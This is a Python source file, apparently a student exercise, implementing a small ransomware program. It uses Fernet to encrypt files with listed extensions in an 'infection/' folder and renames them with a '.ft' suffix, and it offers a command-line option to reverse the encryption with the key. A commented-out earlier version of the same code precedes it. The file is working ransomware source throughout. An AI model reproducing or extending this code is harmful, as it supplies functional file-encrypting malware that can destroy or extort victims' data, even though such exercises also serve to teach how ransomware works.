# import sys
# import os
# from cryptography.fernet import Fernet

# infected = "infection/"

# def decryptfile(file):
#     if file.endswith(".ft"):
#         file = file[:-3]
#     else:
#         return
#     with open('filekey.key', 'rb') as filekey:
#         key = filekey.read()
#     fernet = Fernet(key)
#     with open(file + ".ft", 'rb') as enc_file:
#         encrypted = enc_file.read()
#     decrypted = fernet.decrypt(encrypted)
#     with open(file, 'wb') as dec_file:
#         dec_file.write(decrypted)

# def generatefilekey():
#     key = Fernet.generate_key() # 44 characters
#     with open('filekey.key', 'wb') as filekey:
#         filekey.write(key)

# def encrypt_file(file_path):
#     renamedfile = file_path
#     if not renamedfile.endswith(".ft"):
#         renamedfile = renamedfile + ".ft"
#         os.rename(file_path, renamedfile)
#     with open('filekey.key', 'rb') as filekey:
#         key = filekey.read()
#     fernet = Fernet(key)
#     with open(renamedfile, 'rb') as file_to_encrypt:
#         original = file_to_encrypt.read()
#     encrypted = fernet.encrypt(original)
#     with open(renamedfile, 'wb') as encrypted_file:
#         encrypted_file.write(encrypted)

# def get_ext(file):
#     if os.path.exists(file):
#         with open(file, 'r') as file:
#             extensions = [line.strip() for line in file]
#         return extensions
#     else:
#         print(f"Error: '{file}' not found.")
#         return None

# def getfiles():
#     ext_tab = get_ext("extensions.txt")
#     if ext_tab is not None:
#         if os.path.exists(infected):
#             for file in os.listdir(infected):
#                 path = os.path.join(infected, file)
#                 if any(file.endswith(ext) for ext in ext_tab) and os.path.isfile(path):
#                     encrypt_file(path)
#         else:
#             print(f"Error: Directory '{infected}' not found.")
#     else:
#         return

# def main():
#     generatefilekey()
#     getfiles()
# if __name__ == "__main__":
#     main()


import sys
import os
from cryptography.fernet import Fernet
import argparse

infected = "infection/"

def decryptfile(file):
    if file.endswith(".ft"):
        file = file[:-3]
    else:
        return
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()
    fernet = Fernet(key)
    with open(file + ".ft", 'rb') as enc_file:
        encrypted = enc_file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file, 'wb') as dec_file:
        dec_file.write(decrypted)

def generatefilekey():
    key = Fernet.generate_key() # 44 characters
    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)

def encrypt_file(file_path):
    renamedfile = file_path
    if not renamedfile.endswith(".ft"):
        renamedfile = renamedfile + ".ft"
        os.rename(file_path, renamedfile)
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()
    fernet = Fernet(key)
    with open(renamedfile, 'rb') as file_to_encrypt:
        original = file_to_encrypt.read()
    encrypted = fernet.encrypt(original)
    with open(renamedfile, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def get_ext(file):
    if os.path.exists(file):
        with open(file, 'r') as file:
            extensions = [line.strip() for line in file]
        return extensions
    else:
        print(f"Error: '{file}' not found.")
        return None

def getfiles():
    ext_tab = get_ext("extensions.txt")
    if ext_tab is not None:
        if os.path.exists(infected):
            for file in os.listdir(infected):
                path = os.path.join(infected, file)
                if os.path.isfile(path) and any(file.endswith(ext) for ext in ext_tab):
                    encrypt_file(path)
        else:
            print(f"Error: Directory '{infected}' not found.")
    else:
        return

def reverse_infection(key, silent=False):
    if not key:
        print("Erreur : Aucune clé fournie pour inverser l'infection.")
        return

    # Vérifier si le dossier d'infection existe
    if not os.path.exists(infected):
        print(f"Erreur : Le dossier '{infected}' n'existe pas.")
        return

    # Charger la clé
    with open('filekey.key', 'rb') as filekey:
        original_key = filekey.read()

    # Vérifier si la clé fournie correspond à la clé d'origine
    if key != original_key.decode():
        print("Erreur : Clé incorrecte. L'infection ne peut pas être inversée.")
        return

    # Parcourir les fichiers infectés et les décrypter
    for file in os.listdir(infected):
        path = os.path.join(infected, file)
        if os.path.isfile(path) and file.endswith(".ft"):
            with open(path, 'rb') as enc_file:
                encrypted = enc_file.read()
            
            fernet = Fernet(original_key)
            decrypted = fernet.decrypt(encrypted)

            with open(file[:-3], 'wb') as dec_file:
                dec_file.write(decrypted)

            # Supprimer le fichier infecté
            os.remove(path)

            if not silent:
                print(f"Inversion de l'infection du fichier : {file}")

    if not silent:
        print("Inversion de l'infection terminée.")

def main():
    # Définition du parser
    parser = argparse.ArgumentParser(description="Description de ton programme.", add_help=False)

    # Ajout des options
    parser.add_argument('-v', '--version', action='store_true', help='Afficher la version du programme')
    parser.add_argument('-h', '--help', action='store_true', help='Afficher l\'aide du programme')
    parser.add_argument('-r', '--reverse', type=str, help='Inverser l\'infection avec la clé fournie en argument')
    parser.add_argument('-s', '--silent', action='store_true', help='Exécuter le programme en mode silencieux')

    # Analyser les arguments de la ligne de commande
    args = parser.parse_args()

    # Vérifier les options et effectuer les actions nécessaires
    if args.version:
        print("Version du programme")
    elif args.help:
        parser.print_help()
    elif args.reverse:
        reverse_infection(args.reverse, silent=args.silent)
    else:
        generatefilekey()
        getfiles()

if __name__ == "__main__":
    main()
